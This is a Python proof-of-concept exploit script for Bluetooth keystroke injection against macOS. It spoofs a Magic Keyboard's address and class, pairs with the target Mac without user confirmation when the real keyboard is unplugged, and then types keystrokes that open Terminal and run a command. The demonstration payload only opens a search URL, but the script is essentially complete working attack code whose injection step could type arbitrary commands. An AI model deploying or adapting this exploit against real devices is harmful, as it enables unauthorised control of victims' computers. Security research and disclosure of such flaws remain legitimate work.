#!/usr/bin/env python3

import argparse
import re
import sys
import time
from subprocess import Popen, PIPE, STDOUT

from injector.helpers import assert_address, log, run
from injector.client import KeyboardClient
from injector.hid import Key, Mod
from injector.adapter import Adapter

# parse command line arguments
parser = argparse.ArgumentParser("keystroke-injection-macos.py")
parser.add_argument("-i", "--interface", required=True)
parser.add_argument("-t", "--target_address", required=True)
parser.add_argument("-k", "--keyboard_address", required=True)
args = parser.parse_args()

# do a basic sanity check of the provided arguments
assert_address(args.keyboard_address)
assert_address(args.target_address)
assert(re.match(r"^hci\d+$", args.interface))

# restart the local Bluetooth daemon
run(["sudo", "service", "bluetooth", "restart"])
time.sleep(0.5)

# setup the adapter
# - configure name and class
# - assume the address of the Magic Keyboard
log.status("configuring Bluetooth adapter")
adapter = Adapter(args.interface)
adapter.set_name("Hi, My Name is Keyboard")
adapter.set_class(0x002540)
adapter.set_address(args.keyboard_address)
client = KeyboardClient(args.target_address, auto_ack=True)

# connect to Service Discovery Protocol on the Mac (L2CAP port 1)
log.status("connecting to SDP")
while not client.connect_sdp():
  log.debug("connecting to SDP")
adapter.enable_ssp()
log.success("connected to SDP (L2CAP 1) on target")

# instruct the user to unplug the keyboard
log.notice("""

----------------------------------------------------------------
| Unplug the Magic Keyboard from the Mac to trigger the attack |
----------------------------------------------------------------
""")

# wait for an SDP connection from the Mac
# - when the user unplugs the keyboard from the Mac, the Mac immediately 
#   connects to the SDP service on the Magic Keyboard
# - because we are spoofing the Magic Keyboard while connecting to the 
#   SDP service running on the Mac, the Mac thinks we are the keyboard, 
#   and starts connecting to our machine
# - when we see the SDP connection attempt, we are able to pair with the 
#   Mac and inject keystrokes, without user confirmationgged
with Popen('sudo hcidump -i %s' % adapter.iface, stdout = PIPE, stderr = STDOUT, shell = True) as p:
  while True:  
    line = p.stdout.readline()
    log.debug(line)
    if b"L2CAP(s): Connect req: psm 1" in line:
      break
    if not line: break
    time.sleep(0.001)

# connect to HID Control on the Mac (L2CAP port 17)
log.status("connecting to HID Control")
start = time.time()
while not client.connect_hid_control():
  log.debug("connecting to HID Control")
  time.sleep(0.01)
  if time.time() - start >= 10:
    log.error("failed to connect to HID Control on the Mac")
    adapter.down()
    sys.exit(1)
log.success("connected to HID Control (L2CAP 17) on target")

# connect to HID Interrupt on the Mac (L2CAP port 19)
log.status("connecting to HID Interrupt")
start = time.time()
while not client.connect_hid_interrupt():
  log.debug("connecting to HID Interrupt")
  time.sleep(0.01)
  if time.time() - start >= 10:
    log.error("failed to connect to HID Interrupt on the Mac")
    adapter.down()
    sys.exit(1)
log.success("connected to HID Interrupt (L2CAP 19) on target")

# send an empty keyboard report
# - this will kick off a short exchange on HID Control, 
#   where the Mac attempts to read some properties of the
#   keyboard
# - the KeyboardClient replies to each message from the Mac 
#   with a single 0x00 byte
# - after a brief exchange (1-2 seconds), we can inject keystrokes
client.send_keyboard_report()

# wait for the initial HID exchange to complete
while not client.hid_ready:
  time.sleep(0.001)

# transmit the keystroke payload
# 1. (Commad+Space)
# 2. terminal\n
# 3. (Ctrl+C)
# 4. open "https://google.com/search?q=this+is+fine"\n
log.status("injecting payload")
client.send_keyboard_report(Mod.LeftMeta, Key.LeftMeta, Key.Space)
time.sleep(0.25)
client.send_ascii("terminal\n")
time.sleep(0.25)
client.send_keypress(Key.C, Key.LeftControl, Mod.LeftControl)
client.send_ascii('open "https://google.com/search?q=this+is+fine"\n') 
time.sleep(0.1)

# disconnect the L2CAP sockets
log.success("payload has been transmitted; disconnecting Bluetooth HID client")
client.close()

# take the adapter offline
log.status("taking '%s' offline" % args.interface)
adapter.down()
